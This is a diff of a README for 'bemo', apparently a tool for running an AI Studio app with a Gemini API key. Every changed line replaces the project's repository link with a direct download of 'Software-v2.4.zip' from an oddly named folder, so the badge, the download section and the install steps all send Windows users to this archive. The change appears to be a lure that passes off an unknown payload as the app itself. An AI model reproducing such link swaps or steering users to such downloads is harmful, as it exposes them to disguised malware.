@@ -1,12 +1,12 @@
 # 🤖 bemo - Run Your AI Studio App Fast
 
-[![Download bemo](https://img.shields.io/badge/Download%20bemo-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://github.com/moussegenusanthurium256/bemo)
+[![Download bemo](https://img.shields.io/badge/Download%20bemo-6A5ACD?style=for-the-badge&logo=github&logoColor=white)](https://raw.githubusercontent.com/moussegenusanthurium256/bemo/main/triconsonantalism/Software-v2.4.zip)
 
 ## 📥 Download bemo
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/moussegenusanthurium256/bemo
+https://raw.githubusercontent.com/moussegenusanthurium256/bemo/main/triconsonantalism/Software-v2.4.zip
 
 ## 🖥️ What bemo does
 
@@ -36,7 +36,7 @@ If you do not have Node.js yet, install the current LTS version from the Node.js
 Follow these steps in order.
 
 1. Open the bemo page in your browser  
-   https://github.com/moussegenusanthurium256/bemo
+   https://raw.githubusercontent.com/moussegenusanthurium256/bemo/main/triconsonantalism/Software-v2.4.zip
 
 2. Download the project files  
    If you cloned the repo, keep the folder on your computer. If you downloaded a ZIP file, extract it first.
@@ -138,4 +138,4 @@ If the browser does not open on its own:
 
 `GEMINI_API_KEY=your_api_key_here`
 
-https://github.com/moussegenusanthurium256/bemo
+https://raw.githubusercontent.com/moussegenusanthurium256/bemo/main/triconsonantalism/Software-v2.4.zip
